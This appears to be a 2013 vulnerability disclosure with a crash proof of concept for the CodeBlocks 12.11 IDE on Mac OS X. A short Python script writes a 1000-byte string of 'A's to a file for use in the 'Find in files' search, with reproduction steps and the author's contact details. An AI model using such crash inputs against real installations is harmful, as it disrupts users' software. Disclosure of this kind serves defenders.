# Exploit Title: CodeBlocks 12.11 (Mac OS X) Crash POC
# Date: 27-05-2013
# Exploit Author: ariarat 
# Vendor Homepage: http://www.codeblocks.org
# Software Link: http://sourceforge.net/projects/codeblocks/files/Binaries/12.11/MacOS/codeblocks-12.11-mac.dmg
# Version: 12.11 
# Tested on: [ Mac OS X 10.7.5]
#============================================================================================
# in Search -> Find in files... -> Text to search for: type any character!
# *** path in [Search path] section must be blank ***
#============================================================================================
# Contact :
#------------------
# Web Page : http://ariarat.blogspot.com
# Email    : mehdi.esmaeelpour@gmail.com
#============================================================================================



#!/usr/bin/python

filename="string.txt"
buffer = "\x41" * 1000
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()